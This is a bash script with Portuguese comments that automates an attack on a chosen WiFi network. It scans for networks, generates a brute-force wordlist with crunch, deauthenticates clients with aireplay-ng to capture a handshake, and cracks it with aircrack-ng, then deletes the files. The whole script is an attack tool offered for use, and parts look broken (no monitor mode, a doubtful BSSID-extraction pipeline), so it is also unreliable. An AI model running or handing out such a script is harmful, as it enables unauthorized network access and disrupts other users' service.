#!/bin/bash

# Definir a interface wifi a ser usada
INTERFACE="wlan0"

# Scaneia as redes wifi disponíveis e exibe seus ESSIDs
echo "Redes disponíveis:"
echo "------------------"
sudo iwlist $INTERFACE scan | grep -oP "(?<=ESSID:\").*(?=\")"

# Pede para o usuário escolher a rede alvo
echo ""
read -p "Digite o nome da rede alvo: " TARGET_SSID

# Pede para o usuário escolher o tamanho mínimo e máximo da senha
echo ""
read -p "Digite o tamanho mínimo da senha: " MIN_LENGTH
read -p "Digite o tamanho máximo da senha: " MAX_LENGTH

# Gerar a wordlist usando o crunch
echo "Gerando wordlist..."
crunch $MIN_LENGTH $MAX_LENGTH -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o wordlist.txt

# Iniciar o ataque
echo "Iniciando o ataque..."
sudo airodump-ng --essid $TARGET_SSID -w capture $INTERFACE &
sleep 10
sudo aireplay-ng -0 10 -a $(sudo airodump-ng --essid $TARGET_SSID --output-format csv --write /dev/stdout $INTERFACE | awk -F',' 'NR==2{print $1}') $INTERFACE &
sleep 10
sudo aircrack-ng -w wordlist.txt capture*.cap

# Remover arquivos temporários
echo "Limpando arquivos temporários..."
rm -f capture*.cap wordlist.txt

echo "Ataque concluído!"
